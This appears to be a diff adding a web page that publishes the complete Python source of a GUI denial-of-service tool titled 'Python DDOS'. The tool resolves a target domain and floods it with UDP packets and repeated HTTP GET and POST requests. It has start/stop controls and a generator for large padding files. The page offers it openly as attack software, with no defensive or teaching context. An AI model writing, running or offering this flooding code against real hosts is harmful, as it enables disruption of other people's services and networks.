@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" type="image/x-icon" href="favicon.ico">
+    <title>Python DDOS by pankoza3</title>
+</head>
+<body>
+
+<pre><code>
+import socket
+import threading
+import time
+import requests
+from tkinter import messagebox, Tk, Label, Button, Entry, filedialog, StringVar, simpledialog
+
+class DoSApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("DoS Flood")
+
+        self.theme = StringVar()
+        self.theme.set("light")
+
+        self.apply_theme()
+
+        Label(root, text="IP Address:").grid(row=0, column=0)
+        self.ipTxt = Entry(root)
+        self.ipTxt.grid(row=0, column=1)
+
+        Label(root, text="Data to Send:").grid(row=1, column=0)
+        self.dataTxt = Entry(root)
+        self.dataTxt.grid(row=1, column=1)
+
+        # Button to get IP address from domain
+        Button(root, text="Get ip address", command=self.get_address).grid(row=0, column=2)
+
+        self.flooding = False  # Flag to control the flooding
+        self.floodTimer = None
+
+        Button(root, text="Start Flood", command=self.start_flood).grid(row=2, column=0)
+        Button(root, text="Stop Flood", command=self.stop_flood).grid(row=2, column=1)
+        Button(root, text="Choose File", command=self.choose_file).grid(row=3, column=0)
+        Button(root, text="Generate File", command=self.generate_file).grid(row=3, column=1)
+
+        # Adding GET and POST attack buttons
+        Button(root, text="GET Attack", command=self.start_get_attack).grid(row=4, column=0)
+        Button(root, text="POST Attack", command=self.start_post_attack).grid(row=4, column=1)
+
+        # Theme switch button
+        Button(root, text="Switch to Black Theme", command=self.switch_theme).grid(row=5, column=0, columnspan=2)
+
+    def apply_theme(self):
+        """Applies the selected theme (light or dark)."""
+        if self.theme.get() == "dark":
+            self.root.configure(bg='black')
+            for widget in self.root.winfo_children():
+                widget.configure(bg='black', fg='white')
+        else:
+            self.root.configure(bg='white')
+            for widget in self.root.winfo_children():
+                widget.configure(bg='white', fg='black')
+
+    def switch_theme(self):
+        """Switch between light and dark themes."""
+        if self.theme.get() == "light":
+            self.theme.set("dark")
+            self.apply_theme()
+        else:
+            self.theme.set("light")
+            self.apply_theme()
+
+    def get_address(self):
+        """Gets the IP address for the specified domain."""
+        domain = self.ipTxt.get()
+        ip_address = self.resolve_ip(domain)
+        messagebox.showinfo("IP Address", f"{domain} IP: {ip_address}")
+
+    def resolve_ip(self, domain):
+        """Resolves the domain to an IP address."""
+        try:
+            ip_address = socket.gethostbyname(domain)
+            return ip_address
+        except socket.error as e:
+            return f"Error: {e}"
+
+    def choose_file(self):
+        """Opens a file dialog to choose a file and loads its content into dataTxt."""
+        file_path = filedialog.askopenfilename()
+        if file_path:
+            with open(file_path, 'r') as file:
+                self.dataTxt.delete(0, 'end')
+                self.dataTxt.insert(0, file.read())
+
+    def generate_file(self):
+        """Generates a file with the specified size filled with random data."""
+        try:
+            size = simpledialog.askinteger("Input", "Enter file size in bytes:", minvalue=1)
+            if size:
+                with open("ddosfile.txt", 'w') as file:
+                    file.write('A' * size)  # Generate file filled with 'A' characters
+                messagebox.showinfo("Success", f"File ddosfile.txt of {size} bytes created successfully!")
+        except Exception as e:
+            messagebox.showerror("Error", f"An error occurred: {str(e)}")
+
+    def flood(self):
+        """Handles the DoS flooding logic."""
+        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        try:
+            ip_addr = self.ipTxt.get()
+            send_bytes = self.dataTxt.get().encode('ascii')
+
+            while self.flooding:  # Continue flooding while the flag is set
+                client.sendto(send_bytes, (ip_addr, 80))
+                time.sleep(0.1)  # Sends packets with a delay to avoid locking the system
+        except Exception as e:
+            error_message = f"Something went wrong: {str(e)}"
+            error_caption = "Please ensure you entered everything correctly"
+            messagebox.showerror(error_caption, error_message)
+
+    def start_flood(self):
+        """Starts the DoS flooding thread."""
+        self.flooding = True  # Set the flooding flag to True
+        self.floodTimer = threading.Thread(target=self.flood)
+        self.floodTimer.start()
+
+    def stop_flood(self):
+        """Stops the DoS flooding."""
+        self.flooding = False  # Set the flooding flag to False
+
+    def start_get_attack(self):
+        """Starts a GET request flood."""
+        threading.Thread(target=self.get_attack).start()
+
+    def get_attack(self):
+        """Floods the target with HTTP GET requests."""
+        try:
+            url = f"http://{self.ipTxt.get()}"
+            while self.flooding:
+                requests.get(url)  # Send GET request
+                time.sleep(0.1)  # Delay to avoid overwhelming system
+        except Exception as e:
+            messagebox.showerror("Error", f"GET Attack Failed: {str(e)}")
+
+    def start_post_attack(self):
+        """Starts a POST request flood."""
+        threading.Thread(target=self.post_attack).start()
+
+    def post_attack(self):
+        """Floods the target with HTTP POST requests."""
+        try:
+            url = f"http://{self.ipTxt.get()}"
+            data = {"data": self.dataTxt.get()}
+            while self.flooding:
+                requests.post(url, data=data)  # Send POST request
+                time.sleep(0.1)  # Delay to avoid overwhelming system
+        except Exception as e:
+            messagebox.showerror("Error", f"POST Attack Failed: {str(e)}")
+
+if __name__ == "__main__":
+    root = Tk()
+    app = DoSApp(root)
+    root.mainloop()
+</code></pre>
+
+</body>
+</html>
